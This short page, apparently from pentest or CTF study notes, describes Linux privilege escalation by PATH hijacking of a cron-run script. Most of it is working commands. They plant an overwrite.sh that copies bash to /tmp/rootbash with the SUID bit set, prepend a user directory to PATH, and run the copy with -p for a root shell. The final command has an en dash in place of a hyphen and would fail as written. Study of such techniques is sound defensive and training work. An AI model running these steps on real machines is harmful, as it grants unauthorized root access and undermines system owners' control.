# PATH environment abuse 2

There is another way to escalate the privilege to root.

```
cat /etc/cron
```

<figure><img src="../../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

You can add an additional PATH environment and create a new 'overwrite.sh' to run.&#x20;

{% code overflow="wrap" %}
```bash
# Target machine 
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /home/bla/overwrite.sh

export PATH=/home/bla:$PATH
```
{% endcode %}

Once the /tmp/rootbash file is created, execute it (with -p to preserve the effective UID) to gain a root shell.&#x20;

{% code overflow="wrap" %}
```bash
/tmp/rootbash –p
```
{% endcode %}
